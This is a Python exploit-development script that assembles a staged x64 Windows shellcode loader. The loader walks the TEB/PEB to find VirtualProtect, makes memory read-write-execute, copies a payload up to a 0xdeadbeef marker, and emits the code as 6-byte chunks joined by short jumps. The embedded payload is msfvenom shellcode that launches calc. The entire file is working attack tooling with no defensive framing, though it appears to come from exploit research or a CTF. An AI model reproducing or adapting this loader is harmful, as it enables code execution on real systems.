from utils import tod
from utils import NOP, PREFIX, POSTFIX
from capstone import *
from keystone import *
from pwn import p32 

JMP = b'\xeb\x0c'
JMP2 = b'\xeb\x0f'
JMP2_LIMIT = 17
COUNT = 0
SHOW_RES = True

res_list = []
code_list = []

def add_JMP(code, JMP):
    while True:
        if code in code_list:
            # print("duplicate!")
            code = b"\x90" + code
        else:
            break

    assert len(code) <= 6

    if SHOW_RES:
        print(f'''  {tod(code.ljust(6, NOP) + JMP)},''')
        code_list.append(code)

def disasm64(opcode, arch, mode, show=False, detail=True):
    ctx = Cs(arch, mode)
    ctx.detail = detail
    global COUNT

    for l in ctx.disasm(opcode, 0):
        COUNT+=1
        if show == True:
            print(l)
            continue
        if len(l.bytes) > 6:
            print(f'''invalid length opcode: {l}''')
            exit(-1)
        if COUNT >= JMP2_LIMIT:
            add_JMP(l.bytes, JMP2)
        else:
            add_JMP(l.bytes, JMP)
        # print(new_bytes)
        # print(f"{l.address:04x} --> {l.mnemonic} {l.op_str}")
        # print(l)

def asm64(assembly_code):
    r = Ks(KS_ARCH_X86, KS_MODE_64)
    res = b""
    for c in assembly_code:
        code, cnt = r.asm(c)
        print(code, cnt)
        res += bytes(code)
    return res

def just_dis(opcode, arch, mode):
    ctx = Cs(arch, mode)
    ctx.detail = True
    for l in ctx.disasm(opcode, 0):
        print(l)

sp = b""
# sp = b"\xcc"

# stage1: load TEB data from gs register
sp += b"f\x83\xe4\xf0"                        # and sp, 0xfff0
sp += b"Pj`"                                  # push rax; push 0x60;
sp += b"ZH)\xd4"                              # pop rdx; sub rsp; rdx;
sp += b"eH\x8b2"                              # mov rsi, qword ptr gs:[rdx]
sp += b"H\x8bv\x18"                           # mov rsi, qword ptr [rsi + 0x18]
sp += b"H\x8bv\x10"                           # mov rsi, qword ptr [rsi + 0x10]
sp += b"H\xad"                                # lodsq rax, qword ptr [rsi]
sp += b"H\x8b0"                               # mov rsi, qword ptr [rax]
sp += b"H\x8b~0"                              # mov rdi, qword ptr [rsi + 0x30]
sp += b"\x03W<"                               # add edx, dword ptr [rdi + 0x3c]
sp += b"\x8b\\\x17("                          # mov ebx, dword ptr [rdi + rdx + 0x28]
sp += b"\x8bt\x1f "                           # mov esi, dword ptr [rdi + rbx + 0x20]
sp += b"H\x01\xfe"                            # add rsi, rdi
sp += b"\x8bT\x1f$"                           # mov edx, dword ptr [rdi + rbx + 0x24]
sp += b"\x0f\xb7,\x17"                        # movzx ebp, word ptr [rdi + rdx]
sp += b"\x8dR\x02"                            # lea edx, [rdx + 2]

# stage2: find VirtualProtect with "ualP"     # FIND_VirtualProtect:
sp += b"\xad"                                 # lodsd eax, dword ptr [rsi]
sp += b"H\x8dD\x07\x04"                       # lea rax, [rdi+rax+4]
sp += b"\x818ualP"                            # cmp dword ptr [rax], "ualP"
sp += b"\x0f\x85" + p32(-0x79&0xffffffff)     # jne FIND_VirtualProtect
sp += b"\x8bt\x1f\x1c"                        # mov esi, dword ptr [rdi + rbx + 0x1c]
sp += b"H\x01\xfe"                            # add rsi, rdi
sp += b"\x8b4\xae"                            # mov esi, dword ptr [rsi + rbp*4]
sp += b"H\x01\xf7"                            # add rdi, rsi
sp += b"\x99"                                 # cdq

# stage3: call VirtualProtect
# VirtualProtect(&AreaOfShellcode, 0x20000, 0x40:PAGE_EXECUTE_READWRITE, [rsp+0x70]:just writeable);
sp += b"\xe8\x00\x00\x00\x00"                 # call $5
sp += b"Y"                                    # pop rcx
sp += b"f\x81\xe1\x00\xc0"                    # and cx, 0xc000
sp += b"\xba\x00\x00\x02\x00"                 # mov edx, 0x20000
sp += b"A\xb8@\x00\x00\x00"                   # mov r8d, 0x40
sp += b"I\x89\xe1"                            # mov r9, rsp
sp += b"I\x83\xc1p"                           # add r9, 0x70
sp += b"\xff\xd7"                             # call rdi

# stage4: find address of AreaOfShellcode
sp += b"\xe8\x00\x00\x00\x00"                 # call $5
sp += b"_"                                    # pop rdi
sp += b"\xba\x00\x10\x00\x00"                 # mov edx, 0x1000
sp += b"H\x89\xfe"                            # mov rsi, rdi
sp += b"H)\xd7"                               # sub rdi, rdx
sp += b"\xba%\x01\x00\x00"                    # mov edx, 0x125
sp += b"H\x01\xd6"                            # add rsi, rdx

# stage5 : load shellcode to AreaOfShellcode
# loop to load shellcode                      # MOV_SHELLCODE:
sp += b"\x81>\xef\xbe\xad\xde"                # cmp dword ptr [rsi], 0xdeadbeef
sp += b"\x0f\x84" + p32(-0x10b7&0xffffffff)   # je AreaOfShellcode 
sp += b"H\xa5"                                # movsq qword ptr [rdi], qword ptr [rsi]
sp += b"\x90H\x83\xc6\x0f"                    # nop; add rsi, 0xf;
sp += b"\xe9" + p32(-0x78&0xffffffff)         # JMP MOV_SHELLCODE

print(PREFIX)
# disasm64(sp, CS_ARCH_X86, CS_MODE_64, True, False)
disasm64(sp, CS_ARCH_X86, CS_MODE_64)

# rcx, rdx, r8, r9
# rcx = lpAddress
# rdx = size
# r8  = PAGE_EXECUTE_READWRITE:0x40
# r9  = &originAddress
# VirtualProtect - args
# aa = ["call _next; _next:pop rcx", "and cx, 0xc000", "mov edx, 0x20000", "mov r8d, 0x40", "mov r9, rsp", "add r9, 0x70"]

# load shellcode to [rip-0x3000]
# aa = ["call _next; _next:pop rdi", "mov edx, 0x1000", "mov rsi, rdi", "sub rdi, rdx", "mov edx, 0x125", "add rsi, rdx"]
# aa += ["cmp dword ptr [rsi], 0xdeadbeef"]
# aa = ["movsq [rdi], [rsi]", "nop", "add rsi, 0xf"]
# res = asm64(aa)
# print(res)

# shellcode 
# msfvenom -p windows/x64/exec CMD="calc" -f python
buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
buf += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
buf += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
buf += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
buf += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
buf += b"\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
buf += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
buf += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
buf += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
buf += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
buf += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
buf += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
buf += b"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48"
buf += b"\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d"
buf += b"\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5"
buf += b"\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
buf += b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
buf += b"\xda\xff\xd5\x63\x61\x6c\x63\x00"


# print(buf)
# just_dis(buf, CS_ARCH_X86, CS_MODE_64)

buf = buf + (8 - (len(buf) % 8)) * b"\x90"
buf += b"\xef\xbe\xad\xde\x90\x90\x90\x90" # end flag
# buf = buf + (8 - (len(buf) % 8)) * b"\x90"

print("")
data_list = []
for i in range(0, len(buf), 8):
    a = tod(buf[i:i+8])
    if a in data_list:
        print("fxxk")
    data_list.append(a)
    print(f'''  {a},''')

print(POSTFIX)
